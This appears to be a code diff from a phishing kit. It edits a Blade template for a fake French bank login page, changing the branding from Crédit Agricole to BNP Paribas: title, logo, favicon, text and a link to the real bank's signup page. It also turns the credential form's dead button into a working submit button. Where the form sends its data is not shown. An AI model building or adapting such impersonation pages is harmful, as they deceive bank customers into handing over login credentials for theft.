@@ -5,13 +5,30 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="{{ asset('assets/style.css') }}">
-    <title>Credit Agricole - Connexion</title>
+    <title>BNP Paribas - Connexion</title>
     <!-- Ajoutez le script à l'intérieur de la balise <head> -->
         {{-- Favicon --}}
-    <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('creditAgriLogo.png') }}">
+    <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('logo1.webp') }}">
     {{-- <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> --}}
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.css">
 
+
+    <style>
+        #button-devenir-client {
+    float: right;
+    width: 181px;
+    height: 48px;
+    color: #fff;
+    text-align: center;
+    line-height: 48px;
+    border-radius: 36px;
+    background: 0 0;
+    background-color: #28c3a9;
+    box-shadow: 0 2px 4px 0 rgba(0, 0, 0, .36);
+    padding: 0;
+    margin: 1px 2px 0 10px;
+}
+    </style>
 </head>
 
 <body>
@@ -23,14 +40,18 @@
     </script>
 
     <nav class="navbar">
-        <img src="{{ asset('creditAgriLogo.png') }}" alt="Bnp paribas" style="width: 140px ! important;">
+        <img src="{{ asset('logo1.webp') }}" alt="Bnp paribas" >
         <!-- <h2>Slogan de la banque</h2> -->
         <ul>
-            <li><a href="https://www.credit-agricole.fr">Comptes & Cartes</a></li>
+            {{-- <li><a href="https://www.credit-agricole.fr">Comptes & Cartes</a></li>
             <li><a href="https://www.credit-agricole.fr/particulier/epargne/livret-epargne-logement/livret-a.html">Epargne</a></li>
             <li><a href="https://www.credit-agricole.fr/particulier/assurances/habitation/assurance-habitation.html">Assurance</a></li>
             <li><a href="https://www.credit-agricole.fr/particulier/credit/immobilier/credit-immobilier-facilimmo.html">Credit</a></li>
-            <li><a href="#">Contact</a></li>
+            <li><a href="#">Contact</a></li> --}}
+
+            <li>
+                <a id="button-devenir-client" href="https://mabanque.bnpparibas/fr/devenir-client-bnp-paribas" class="bouton-devenir-client part-only">Devenir client</a>
+            </li>
         </ul>
         <button class="menu-btn">&#9776;</button>
     </nav>
@@ -56,7 +77,7 @@
                     <!-- Ajoutez ceci à l'intérieur de votre formulaire, juste avant le bouton de soumission -->
                     <div id="error-message" style="color: red; margin-top: 10px; display: none;"></div>
 
-                    <button type="button" id="error-connecte">ACCÉDER À MES COMPTES</button>
+                    <button type="submit">ACCÉDER À MES COMPTES</button>
 
 
                 </form>
@@ -65,7 +86,7 @@
                 <h3>Téléchargez l’application Ma Banque
 
                     Chacun d’entre vous gère différemment ses besoins bancaires.
-                    Seul ou accompagné, au Crédit Agricole, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.</h3>
+                    Seul ou accompagné, au Bnp paribas, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.</h3>
             </div>
         </div>
         <div class="right-section">
